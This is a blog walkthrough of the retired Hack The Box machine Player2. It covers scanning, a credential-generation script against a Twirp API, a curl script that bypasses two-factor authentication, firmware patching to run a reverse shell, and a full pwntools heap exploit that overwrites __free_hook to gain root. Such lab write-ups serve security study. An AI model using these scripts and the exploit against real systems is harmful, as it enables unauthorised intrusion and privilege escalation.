---
layout: post
title: "Player2: Hack The Box Walkthrough"
date: 2020-06-27 16:56:28 +0000
last_modified_at: 2020-06-27 16:56:28 +0000
category: Walkthrough
tags: ["Hack The Box", Player2, retired, Linux, Insane]
comments: true
image:
  feature: player2-htb-walkthrough.png
---

This post documents the complete walkthrough of Player2, a retired vulnerable [VM][1] created by [MrR3boot][2] and [b14ckh34rt][3], and hosted at [Hack The Box][4]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

PlayerTwo is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun1 -p1-65535,U:1-65535 10.10.10.170 --rate=700

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-17 08:52:24 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.170
Discovered open port 22/tcp on 10.10.10.170
Discovered open port 8545/tcp on 10.10.10.170
```

Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80,8545 -A -oN nmap.txt 10.10.10.170
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 0e:7b:11:2c:5e:61:04:6b:e8:1c:bb:47:b8:4d:fe:5a (RSA)
|   256 18:a0:87:56:64:06:17:56:4d:6a:8c:79:4b:61:56:90 (ECDSA)
|_  256 b6:4b:fc:e9:62:08:5a:60:e0:43:69:af:29:b3:27:14 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
8545/tcp open  http    (PHP 7.2.24-0ubuntu0.18.04.1)
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 404 Not Found
|     Date: Tue, 17 Dec 2019 09:04:04 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
|     Content-Type: application/json
|_    {"code":"bad_route","msg":"no handler for path "/"","meta":{"twirp_invalid_route":"GET /"}}
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-title: Site doesn't have a title (application/json).
```

Looks like we have two `http` services. This is how they look like.

_80/tcp_

{% include image.html image_alt="4b93fd41.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/4b93fd41.png" %}

_8545/tcp_

{% include image.html image_alt="375beaf8.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/375beaf8.png" %}

A quick Google search on `twirp_invalid_route` reveals that we might be looking at [Twirp](https://twitchtv.github.io/twirp/docs/intro.html).

### Directory/File Enumeration

We'd better put `player2.htb` into `/etc/hosts` and see what happens.

{% include image.html image_alt="08ae8f15.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/08ae8f15.png" %}

Very uplifting! Now, let's see what `gobuster` can find.

```
# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -t 20 -u http://player2.htb/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://player2.htb/
[+] Threads:        20
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2019/12/17 09:25:12 Starting gobuster
===============================================================
http://player2.htb/.htaccess (Status: 403)
http://player2.htb/.htpasswd (Status: 403)
http://player2.htb/.hta (Status: 403)
http://player2.htb/assets (Status: 301)
http://player2.htb/images (Status: 301)
http://player2.htb/index (Status: 200)
http://player2.htb/index.php (Status: 200)
http://player2.htb/mail (Status: 200)
http://player2.htb/proto (Status: 301)
http://player2.htb/server-status (Status: 403)
http://player2.htb/src (Status: 301)
http://player2.htb/vendor (Status: 301)
===============================================================
2019/12/17 09:26:24 Finished
===============================================================
```

Nothing I can immediately use really but if you looked at the site (`player2.htb`), you'll notice that there's another subdomain, `product.player2.htb`. This is how it looks like.

{% include image.html image_alt="31f2a129.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/31f2a129.png" %}

Hmm. A login page??!! Likewise, we'll put `product.player2.htb` into `/etc/hosts` and have another go at `gobuster`.

```
# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -t 20 -u http://product.player2.htb/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://product.player2.htb/
[+] Threads:        20
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2019/12/17 17:43:29 Starting gobuster
===============================================================
http://product.player2.htb/.hta (Status: 403)
http://product.player2.htb/.htaccess (Status: 403)
http://product.player2.htb/.htpasswd (Status: 403)
http://product.player2.htb/api (Status: 301)
http://product.player2.htb/assets (Status: 301)
http://product.player2.htb/conn (Status: 200)
http://product.player2.htb/home (Status: 302)
http://product.player2.htb/images (Status: 301)
http://product.player2.htb/index (Status: 200)
http://product.player2.htb/index.php (Status: 200)
http://product.player2.htb/mail (Status: 200)
http://product.player2.htb/server-status (Status: 403)
===============================================================
2019/12/17 17:44:23 Finished
===============================================================
```

What a shit show! I have nothing.

### Twitch Twirp

Meet Twirp, a simple RPC framework built on protobuf. As you probably have guessed by now, the Twirp service is behind `8545/tcp` but we have no way of communicating to it.

In order to talk to the backend service, I need to know the service definition, a plain text file ending with `.proto` extension according to the [example](https://twitchtv.github.io/twirp/docs/example.html) in the documentation. Let's see if `gobuster` can find this file. I have a few suspect locations:


+ player2.htb/proto
+ player2.htb/src
+ product.player2.htb/api


```
# gobuster dir -w dirbuster.txt -e -t 64 -x proto -u http://player2.htb/proto/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://player2.htb/proto/
[+] Threads:        64
[+] Wordlist:       dirbuster.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     proto
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2019/12/18 06:11:18 Starting gobuster
===============================================================
http://player2.htb/proto/generated.proto (Status: 200)
Progress: 56604 / 220547 (25.67%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2019/12/18 06:18:49 Finished
===============================================================
```

Woohoo. There's a hit at `player2.htb/proto`!

{% include image.html image_alt="17759be5.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/17759be5.png" %}

#### Protobuf vs JSON

For some reason I couldn't get the JSONclient to work with cURL. Good thing there's still ProtobufClient available to use which is Twirp's recommendation by the way. With that, I wrote a simple script to generate credentials based on the service definition above.

<div class="filename"><span>gencreds.sh</span></div>

```bash
#!/bin/bash

HOST=product.player2.htb
PORT=8545
COUNT=$1

echo "count:$COUNT" \
        | protoc --encode twirp.player2.auth.Number generated.proto \
        | curl  -s \
                -XPOST \
                -H "Content-Type: application/protobuf" \
                --data-binary @- \
                http://$HOST:$PORT/twirp/twirp.player2.auth.Auth/GenCreds \
        | protoc --decode twirp.player2.auth.Creds generated.proto

echo
```

I generated 100 pairs of username and password, out of which there are four unique usernames and passwords respectively.

<div class="filename"><span>name.txt</span></div>

```
0xdf
jkr
mprox
snowscan
```

<div class="filename"><span>pass.txt</span></div>

```
Lp-+Q8umLW5*7qkc
tR@dQnwnZEk95*6#
XHq7_WJTA?QD_?E2
ze+EKe-SGF^5uZQX
```

I then used these wordlists to try to login on `product.player2.htb` with `wfuzz`.

```
# wfuzz -w name.txt -w pass.txt -d "username=FUZZ&password=FUZ2Z&Submit=Sign+In" --hs "Nope" http://product.player2.htb/
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://product.player2.htb/
Total requests: 16

==================================================================
ID      Response   Lines      Word         Chars          Payload    
==================================================================

000003:  C=302      0 L        0 W            0 Ch        "0xdf - XHq7_WJTA?QD_?E2"
000010:  C=302      0 L        0 W            0 Ch        "mprox - tR@dQnwnZEk95*6#"

Total time: 2.814284
Processed Requests: 16
Filtered Requests: 14
Requests/sec.: 5.685282
```

### Overcoming two-factor authentication

Any of the pairs of credentials above work but we are faced with another problem: two-factor authentication. There's another layer of authentication at `product.player2.htb/totp`.

{% include image.html image_alt="a1cc3df3.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/a1cc3df3.png" %}

Recall the `/api` path discovered above? Perhaps it has something to do with TOTP?

```
# curl -i http://product.player2.htb/api/totp
HTTP/1.1 200 OK
Date: Thu, 19 Dec 2019 03:30:22 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: PHPSESSID=jn1971v51c1ag0l1epir7fqtnp; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 25
Content-Type: application/json

{"error":"Cannot GET \/"}
```

This is great news actually. For one, we know that `/api/totp` exists and that we can't use GET. Let's try with POST.

```
# curl -i -XPOST http://product.player2.htb/api/totp
HTTP/1.1 200 OK
Date: Thu, 19 Dec 2019 03:31:58 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: PHPSESSID=v2umq1s5uks3kvdd4nq3il7vgl; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 27
Content-Type: application/json

{"error":"Invalid Session"}
```

Let's introduce the PHPSESSID cookie we obtained earlier after the successful logon and the appropriate Content-Type.

```
# curl -i -XPOST -H "Content-Type: application/json" -b "PHPSESSID=qdm4oas8g2e5uto1lrug035p0o" http://product.player2.htb/api/totp
HTTP/1.1 200 OK
Date: Thu, 19 Dec 2019 03:32:46 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 26
Content-Type: application/json

{"error":"Invalid action"}
```

Getting warmer. Let's introduce some `action`.

```
# curl -i -H "Content-Type: application/json" -b "PHPSESSID=qdm4oas8g2e5uto1lrug035p0o" -d '{"action": "hello"}'  http://product.player2.htb/api/totp
HTTP/1.1 200 OK
Date: Thu, 19 Dec 2019 03:35:54 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 30
Content-Type: application/json

{"error":"Missing parameters"}
```

Hmm. We now have missing parameters. I wonder what that means...Maybe we can use the API to generate the backup codes?

```
# curl -i -H "Content-Type: application/json" -b "PHPSESSID=qdm4oas8g2e5uto1lrug035p0o" -d '{"action": "backup_codes"}'  http://product.player2.htb/api/totp
HTTP/1.1 200 OK
Date: Thu, 19 Dec 2019 03:37:41 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 39
Content-Type: application/json

{"user":"0xdf","code":"91231238385454"}
```

Bingo! Armed with this insight, I wrote a simple script to grab an authenticated session cookie for session replay.

<div class="filename"><span>auth.sh</span></div>

```bash
#!/bin/bash

HOST=product.player2.htb
USER=$1
PASS=$2
COOKIE=$(mktemp -u)
PROXY=http://127.0.0.1:8080

curl    -s \
        -c $COOKIE \
        -H "Referer: http://$HOST/" \
        -L \
        -d "username=$USER&password=$PASS&Submit=Sign+In" \
        -o /dev/null \
        http://$HOST/

BACKUP=$(curl   -s \
                -b $COOKIE \
                -H "Content-Type: application/json" \
                -d '{"action": "backup_codes"}' \
                http://$HOST/api/totp \
         | cut -d'"' -f8)

curl    -s \
        -b $COOKIE \
        -H "Referer: http://$HOST/totp" \
        -L \
        -d "otp=$BACKUP&Submit=Submit" \
        -o /dev/null \
        http://$HOST/totp

cat $COOKIE | sed '$!d' | awk '{ print $NF }'

# clean up
rm -rf $COOKIE
```

Let's grab an authenticated session cookie and see what gives.

{% include image.html image_alt="ccb8bfe9.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/ccb8bfe9.png" %}

Awesome!

### Protobs Documentation

After getting into the Protobs home page, there's a documentation about the Protobs firmware at `http://product.player2.htb/protobs.pdf`

{% include image.html image_alt="b4299147.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/b4299147.png" %}

Right off the bat I noticed something amiss. The bootloader will try to load the main firmware regardless of whether the update signature is valid or not. At the bottom of the documentation is the location to download the firmware and where to upload the firmware as a tarball.

{% include image.html image_alt="5d5a5247.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/5d5a5247.png" %}

### Analysis of Protobs.bin

According to the documentation, `Protobs.bin` is made up of 64-byte signature at the top while the remainder is code, specifically, an ELF file.

```
# binwalk Protobs.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
64            0x40            ELF, 64-bit LSB executable, AMD x86-64, version 1 (SYSV)
```

Let's extract the ELF file for further analysis.

```
# dd if=Protobs.bin of=protobs skip=64 bs=1
```

Now, let's run it with `ltrace`.

{% include image.html image_alt="dfdb87b6.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/dfdb87b6.png" %}

Interesting. It's calling the `system` library function with `stty`. What's the offset to `stty` in `Protobs.bin`?

{% include image.html image_alt="6b6eef54.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/6b6eef54.png" %}

I think I know how this works. We can modify the longer `stty` string with a hexeditor to something of use to us, say, a `msfvenom`-generated reverse shell.

## Low-Privilege Shell

Long story short, I uploaded the modified tarball twice. The first time to download the reverse shell, the second time to make the reverse shell executable and to run it. This is the upload page (`product.player2.htb/protobs/`).

{% include image.html image_alt="e8c6ff12.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/3242bc94.png" %}

The first uploaded tarball to download our reverse shell to `/tmp`.

{% include image.html image_alt="70b8ffc9.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/70b8ffc9.png" %}

The second uploaded tarball to make our reverse shell executable and to run it.

{% include image.html image_alt="58316b18.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/58316b18.png" %}

And we got shell!

{% include image.html image_alt="a8588969.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/a8588969.png" %}

### Mosquitto MQTT

During enumeration of `www-data`'s account, I notice that the MQTT broker is listening at `1883/tcp` and that `mosquitto_pub` and `mosquitto_sub` are installed. This tells me that I should probably be subscribing for topics to snoop. I tried `mosquitto_sub -t \#` at first. I got nothing except Protobs broadcast messages like so.

{% include image.html image_alt="2116cdaf.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/2116cdaf.png" %}

It then dawned on me that I should take a look at the $SYS topics as well. Note that mosquitto supports two wildcards, "+" matches a single level of hierarchy while "#" matches all subsequent levels of hierarchy. The $SYS hierarchy does not match a subscription of "#". If you want to observe the entire $SYS hierarchy, subscribe to $SYS/#.

Check this out.

```
$ mosquitto_sub -v -t '$SYS/#'
```

{% include image.html image_alt="4c05ce5f.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/4c05ce5f.png" %}

Looks like we have a RSA key!

### Getting `user.txt`

Armed with the RSA private key, let's see if we can log in to `observer`'s account.

{% include image.html image_alt="c000b6a4.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/c000b6a4.png" %}

Awesome.

The file `user.txt` is at `observer`'s home directory.

{% include image.html image_alt="46740fb9.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/46740fb9.png" %}

## Privilege Escalation

During enumeration of observer's account, I notice another documention at `/home/observer/Development`.

{% include image.html image_alt="421ba59b.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/421ba59b.png" %}

In the documentation, there's a mention of a configuration utility, but where?

{% include image.html image_alt="166726bd.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/166726bd.png" %}

It's not hard to find it.

{% include image.html image_alt="87b54dff.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/87b54dff.png" %}

The SUID executable must be our ticket to `root`.

### Vulnerability Analysis of `Protobs`

There's a off-by-one bug when the description is `read` from `stdin`. The description size MUST BE less than or equal to the bytes read.

{% include image.html image_alt="6a504a87.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/6a504a87.png" %}

### Exploit Development

The binary uses glibc-2.29, which has tcache enabled and double-free mitigation. The binary also has the following protection mechanisms on.

{% include image.html image_alt="c1f96157.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/c1f96157.png" %}

So, my game plan is as follows:

1. Leak libc
2. Bypass tcache double-free mitigation in glibc-2.29
3. tcache poisoning to trick `malloc` into returning `__free_hook`
4. Overwrite `__free_hook` to `system`

Here's my heavily commented exploit.

<div class="filename"><span>exploit.py</span></div>

```python
from pwn import *

# Context
context.arch = "amd64"
context.terminal = ["xterm", "-e", "sh", "-c"]

# Helper functions
#
# There are two `malloc()'s in a new configuration.
# The first malloc has a fixed size - malloc(0x38).
# The second malloc is controlled by the description size.
#
def add(c, size, data):
	r.recvuntil("$ ")
	r.sendline('2')
	r.recvuntil("]: ")
	if len(c) == 1:
		r.sendline(c * 0x14)
	else:
		r.sendline(c)
	r.recvuntil("]: ")
	r.sendline(str(0))
	r.recvuntil("]: ")
	r.sendline(str(0))
	r.recvuntil("]: ")
	r.sendline(str(0))
	r.recvuntil("]: ")
	r.sendline(str(0))
	r.recvuntil("]: ")
	r.sendline(str(0))
	r.recvuntil("]: ")
	r.sendline(str(size))
	if size > 0:
		r.recvuntil("]: ")
	else:
		r.recvuntil('\n')
	r.sendline(data)

def display(index):
	r.recvuntil("$ ")
	r.sendline('3')
	r.recvuntil("]: ")
	r.sendline(str(index))

def delete(index):
	r.recvuntil("$ ")
	r.sendline('4')
	r.recvuntil("]: ")
	r.sendline(str(index))

def show():
	r.recvuntil("$ ")
	r.sendline('1')

def bye():
	r.recvuntil("$ ")
	r.sendline('5')

# Process information
binary  = "./Protobs"
libc    = "./libc-so.6"
host    = "10.10.10.170"
port    = 31337

# Attach gdb here
#
# 0x400cf0 -> list_configs
# 0x401012 -> new_config
# 0x400e95 -> read_config
# 0x400da0 -> del_config
#
def debug(breakpoints):
	script = ""
	for bp in breakpoints:
		script += "break *%s\n" % hex(bp)
	script += "continue"
	gdb.attach(r, script)

def start():
	if not args.REMOTE:
		return process(binary)
	else:
		return remote(host, port)

r = start()
if args.GDB:
	debug([0x400cf0, 0x401012, 0x400e95, 0x400da0])

# Vulnerability Analysis
# ---------------------
# There's a off-by-one bug when the description is `read' from stdin.
# The description size MUST BE less than or equal to the bytes read.
#
# Exploit Development
# -------------------
# 1) Leak GLIBC
#
# Preparation:
# 7 pairs of chunk for tcache bins.
# 2 pairs of chunk: one pair for unsorted bin; another to prevent top chunk consolidation.
for i in range(8):
	c = chr(0x41 + i)
	add(c, 0x100, c * 0x100)

add('\x49', 0x20, '\x49' * 0x20) # prevent top chunk consolidation

# free() the first 8 pairs of chunk
# The first 7 pairs fill up tcache[0x40] and tcache[0x110] bins respectively.
# The 8th pair fills up fastbin[0x40] and unsorted[0x110] bins respectively.
for i in range(8):
	delete(i)

# Empty tcache bins in LIFO manner
for i in range(7):
	c = chr(0x41 + i)
	add(c, 0x100, c * 0x100)

# Add the 8th pair of chunk
# The first malloc() will grab a chunk from fastbin[0x40] since tcache bins are empty.
# If description size is 0, the second malloc() is skipped; FD and BK are untouched.
add('\x48', 0x0, '')

# Display description which contains the address of main_arena.
display(7)
r.recvuntil("Description         ]: ")

libc = ELF("./libc.so.6")

# Calculate libc, __free_hook and system
main_arena_off = 0x1e4ca0
main_arena     = unpack(r.recv(6), 48)
libc_base      = main_arena - main_arena_off
libc.address   = libc_base
free_hook      = libc.symbols["__free_hook"]
system         = libc.symbols["system"]
shell          = "/bin/sh\x00"

info("libc        : %s" % hex(libc_base))
info("__free_hook : %s" % hex(free_hook))
info("system      : %s" % hex(system))

# Exploit Development
# -------------------
# 2) Bypass tcache double-free mitigation in GLIBC 2.29
#
# Preparation:
# free() the first pair since we need a 0x40 chunk from the tcache[0x40] bin.
# Add a 0x40 chunk and a 0x120 chunk. The 0x120 chunk is allocated from top chunk.
# It's important that the 0x120 chunk is next to the last allocated chunk (0x30).
# We are going to use the off-by-one bug to change the size of the 0x120 chunk to 0x100.
delete(0)
add('\x48', 0x110, '\x48' * 0x110) # first pair

# free() the 1st pair to fill up tcache[0x40] and tcache[0x120] bins respectively.
delete(0)

# free() and add the 9th pair
# Make use of the off-by-one bug to change the size of the 0x120 chunk to 0x100.
delete(8)
add('\x49', 0x28, '\x49' * 0x28)

# free() and add the first pair
# Add "/bin/sh\x00" for later use.
delete(0)
add('\x49', 0x28, shell + '\x49' * (0x28 - len(shell)))

# Add and free() the 9th pair to fill up tcache[0x100] bin.
# We skip the second malloc() because of the re-sized pointer.
add('\x49', 0x0, '')
delete(8)

# At this point, this is what the tcache bins look like.
# tcache[0x40]  ->  0x604a40
# tcache[0x100] ->  0x604d50
# tcache[0x120] ->  0x604d50
#
# Add and free() the 9th pair.
# The first malloc() grabs from tcache[0x40] while the second malloc() grabs from tcache[0x120]
add('\x49', 0x110, '\x49' *  0x110)
delete(8)

# At this point, this is what the tcache bins look like.
# tcache[0x40]  ->  0x604a40
# tcache[0x100] ->  0x604d50  ->  0x604d50
#
# Add a 9th pair to grab a chunk from tcache[0x40] and tcache[0x100] bins respectively.
# The FD of the chunk from tcache[0x100] bin is changed to __free_hook.
add('\x49', 0xf0, p64(free_hook) + '\x49' * 0xe8)

# At this point, this is what the tcache bins look like.
# tcache[0x100]  ->  0x604d50  ->  0x7ffff7fc85a8
# Add a 10th and 11th pair to grab 2 chunks from tcache[0x100] bin.
add('\x50', 0xf0, '\x50' * 0xf0)
add('\x51', 0xf0, p64(system) * 0xe8) # overwrite __free_hook to system

# We got shell!
delete(0)
r.interactive()
```

### Exploiting `Protobs`

I find it easier to `scp` a [static](https://github.com/andrew-d/static-binaries) `socat` to the remote machine than copying the `pwntools` library.

```
# scp -i observer.key socat observer@10.10.10.170:/dev/shm
```

Once `socat` is `chmod` to executable, we can do the following.

{% include image.html image_alt="9456c2ef.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/9456c2ef.png" %}

Now let's launch our attack on Protobs.

{% include image.html image_alt="1b551d1c.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/1b551d1c.png" %}

With a `root(euid=0)` shell, getting `root.txt` is trivial.

{% include image.html image_alt="4b6a1eb7.png" image_src="/5839e089-8564-49d1-9f19-dbd621b89794/4b6a1eb7.png" %}

[1]: https://www.hackthebox.eu/home/machines/profile/221
[2]: https://www.hackthebox.eu/home/users/profile/13531
[3]: https://www.hackthebox.eu/home/users/profile/64903
[4]: https://www.hackthebox.eu/
